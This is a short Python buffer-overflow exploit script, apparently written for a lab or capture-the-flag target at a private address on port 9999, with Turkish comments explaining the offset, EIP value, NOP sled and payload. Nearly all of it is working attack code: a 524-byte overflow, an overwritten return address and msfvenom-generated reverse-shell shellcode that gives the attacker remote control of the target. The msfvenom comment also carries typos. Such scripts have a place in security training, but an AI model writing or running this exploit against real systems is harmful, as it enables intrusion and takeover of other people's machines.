#!/usr/bin/env python3 
import sys,time,socket
ip = "10.10.53.46"
port = 9999
timeout = 5

# msfvneom -p linux/x86/shell_reverse_tcp LHOST=<localhost> LPORT=<> EXITFUNV=thread -b "\x00" -f python
buf =  " "
buf += "\xb8\x0e\x6b\x63\xb2\xdb\xd2\xd9\x74\x24\xf4\x5d"
buf += "\x2b\xc9\xb1\x12\x31\x45\x12\x83\xed\xfc\x03\x4b"
buf += "\x65\x81\x47\x62\xa2\xb2\x4b\xd7\x17\x6e\xe6\xd5"
buf += "\x1e\x71\x46\xbf\xed\xf2\x34\x66\x5e\xcd\xf7\x18"
buf += "\xd7\x4b\xf1\x70\xe2\xa3\x57\x93\x9a\xb1\x57\x86"
buf += "\x8e\x3f\xb6\x18\x48\x10\x68\x0b\x26\x93\x03\x4a"
buf += "\x85\x14\x41\xe4\x78\x3a\x15\x9c\xec\x6b\xf6\x3e"
buf += "\x84\xfa\xeb\xec\x05\x74\x0a\xa0\xa1\x4b\x4d"

prefix = ""
string = prefix + "A" * 524 + "\xf3\x12\x17\x31" + "\x90" * 16 + buf
# 524 = Arabelleğin tam taşma değeri
# "\xf3\x12\x17\x31" = 4 baytlık EIP değeri
# "\x90" * 16 = 16 baytlık boş veri
# buf = Payload

try:
        with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
                s.settimeout(timeout)
                s.connect((ip,port))
                s.send(bytes(string,"latin-1"))
except:
        print ("Could not connect")